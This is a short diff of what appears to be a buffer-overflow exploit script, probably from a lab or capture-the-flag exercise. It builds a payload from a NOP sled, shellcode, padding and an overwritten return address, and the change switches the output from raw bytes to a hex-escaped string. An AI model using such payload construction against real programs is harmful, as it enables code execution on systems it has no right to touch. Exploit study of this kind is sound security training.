@@ -26,6 +26,6 @@ payload = nop * (bufsize - (len(shellcode) + 8 + 6)) + shellcode
 buff_addr = b"\x90\x90\xff\xff\xff\x7f"
 payload = payload + b"\xaa\xaa" + buff_addr
 
-sys.stdout.buffer.write(payload)
+# sys.stdout.buffer.write(payload)
 # print(payload.decode('latin-1'))
-# print(''.join(f"\\x{b:02x}" for b in payload))
+print(''.join(f"\\x{b:02x}" for b in payload))
